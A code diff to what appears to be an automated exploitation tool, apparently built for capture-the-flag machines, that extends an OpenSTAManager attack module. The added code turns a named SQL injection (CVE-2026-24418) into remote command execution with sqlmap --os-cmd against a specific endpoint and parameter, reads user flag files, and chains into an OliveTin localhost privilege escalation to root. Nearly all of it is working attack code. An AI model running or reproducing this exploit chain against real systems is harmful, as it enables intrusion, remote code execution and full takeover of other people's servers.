@@ -196,10 +196,6 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
         utils.log("hot", f"authenticated to OpenSTAManager as {user} — running "
                          "SQLi extraction (CVE-2026-24418)", indent=1)
         got = _sqlmap_dump(host, base, cookiefile)
-        try:
-            os.unlink(cookiefile)
-        except OSError:
-            pass
         if got:
             host.add(Finding(
                 title="OpenSTAManager SQLi extraction (CVE-2026-24418)",
@@ -208,9 +204,63 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
                        "then RCE via `sqlmap --os-shell` (SELECT INTO OUTFILE) for "
                        "the user flag.", severity="critical", category="vuln",
                 port=_port(base), service="http", evidence=login))
+            # Turn the SQLi into command execution (OUTFILE webshell / UDF) and
+            # use that channel for the user flag and the OliveTin root privesc.
+            _post_foothold(host, base, cookiefile)
+            try:
+                os.unlink(cookiefile)
+            except OSError:
+                pass
             return True
+        try:
+            os.unlink(cookiefile)
+        except OSError:
+            pass
     utils.log("dim", "could not authenticate with the known portal logins", indent=1)
     return False
+
+
+def _post_foothold(host: HostReport, base: str, cookiefile: str) -> None:
+    """Escalate SQLi -> RCE via sqlmap --os-cmd, grab the user flag, then drive
+    the OliveTin localhost privesc over that same command channel to root."""
+    from . import olivetin
+    probe = _os_cmd(base, cookiefile, "id; hostname")
+    if not probe or "uid=" not in probe:
+        utils.log("dim", "SQLi confirmed but command exec (OUTFILE/UDF) not "
+                         "available here — no FILE priv or writable webroot; "
+                         "OliveTin root path is in the findings", indent=1)
+        olivetin.playbook_finding(host)
+        return
+    utils.log("hot", "SQLi -> RCE (sqlmap --os-cmd): command execution as the web "
+                     "user", indent=1)
+    flags = _os_cmd(base, cookiefile,
+                    "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
+    _harvest(host, (probe + "\n" + (flags or "")), base)
+    # root: OliveTin on 127.0.0.1:1337 driven through this exec channel.
+    olivetin.escalate(host, lambda c: _os_cmd(base, cookiefile, c) or "")
+
+
+def _os_cmd(base: str, cookiefile: str, cmd: str) -> str:
+    """Run one shell command on the target via sqlmap --os-cmd and return its
+    stdout. Reuses the confirmed Scadenzario injection point."""
+    url = base + "/actions.php?id_module=18"
+    argv = [tooling.resolve("sqlmap") or "sqlmap", "-u", url,
+            "--load-cookies", cookiefile,
+            "--data", "op=bulk&id_records[]=1&id_plugin=1",
+            "-p", "id_records[]", "--dbms=mysql", "--batch",
+            "--technique=E", "--os-cmd", cmd]
+    try:
+        r = subprocess.run(argv, timeout=300, capture_output=True, text=True,
+                           errors="replace")
+    except (OSError, subprocess.SubprocessError):
+        return ""
+    out = (r.stdout or "") + (r.stderr or "")
+    # sqlmap prints:  command standard output: '...'
+    m = re.search(r"command standard output:\s*(?:'([^']*)'|\n?-+\n(.*?)\n-+)",
+                  out, re.S)
+    if m:
+        return (m.group(1) or m.group(2) or "").strip()
+    return out if "uid=" in out else ""
 
 
 def _login(base: str, vhost: str, user: str, pw: str) -> Optional[str]:
